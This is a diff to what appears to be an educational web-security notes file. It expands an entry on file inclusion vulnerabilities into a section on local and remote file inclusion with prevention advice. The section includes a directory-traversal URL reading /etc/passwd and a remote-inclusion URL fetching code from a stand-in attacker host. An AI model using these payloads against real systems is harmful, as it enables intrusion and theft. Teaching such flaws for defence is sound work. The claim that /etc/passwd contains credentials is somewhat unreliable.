@@ -1151,7 +1151,33 @@ There are numerous tools available that can be used for testing and educational 
 ###### Note: Using these tools for malicious purposes is illegal and unethical. Only use them for educational purposes in a safe and controlled environment.
 
 ---
-* **File inclusion vulnerability:** File inclusion vulnerabilities occur when an application fails to properly sanitize user input, allowing an attacker to include arbitrary files in the application. This can allow the attacker to execute arbitrary code, steal sensitive information, or access files they should not be able to access.
+#### File inclusion vulnerability:
+File inclusion vulnerability is a type of vulnerability that allows an attacker to include a file from a remote server or from the local file system of the web server. This can lead to serious security issues, such as unauthorized access to sensitive files, system compromise, and data theft.
+
+There are two types of file inclusion vulnerabilities:
+
+* Local File Inclusion (LFI): LFI occurs when an attacker can include a file from the local file system of the web server. This can allow the attacker to view sensitive files, such as configuration files, user credentials, and other system files.
+
+* Remote File Inclusion (RFI): RFI occurs when an attacker can include a file from a remote server. This can allow the attacker to execute arbitrary code on the web server and potentially take control of the system.
+
+> File inclusion vulnerabilities are typically exploited by manipulating input fields, such as GET and POST parameters, cookies, and user agents. The attacker may use various techniques, such as directory traversal, null byte injection, and encoding, to bypass security measures and include the desired file.
+
+Here is an example of an LFI vulnerability:
+```
+http://www.example.com/index.php?page=../../../../etc/passwd
+```
+
+In this example, the attacker is manipulating the "page" parameter to include the /etc/passwd file from the local file system of the web server. This file contains sensitive information such as user credentials, which can be used to gain unauthorized access to the system.
+
+Here is an example of an RFI vulnerability:
+
+```
+http://www.example.com/index.php?url=http://www.attacker.com/malicious-code.php
+```
+In this example, the attacker is manipulating the "url" parameter to include a remote file from the attacker's server. This file contains malicious code that can be executed on the web server and potentially compromise the system.
+
+> To prevent file inclusion vulnerabilities, sanitize user input, validate file paths, and restrict access to sensitive files. Developers should also avoid using user input to construct file paths and use absolute paths instead. Finally, using web application firewalls and monitoring tools can help detect and mitigate file inclusion attacks.
+
 ---
 * **Insecure direct object references:** Insecure direct object references occur when an application exposes a reference to an internal object, such as a file or database record, without proper access control. This can allow an attacker to access or modify data they should not be able to access.
 ---
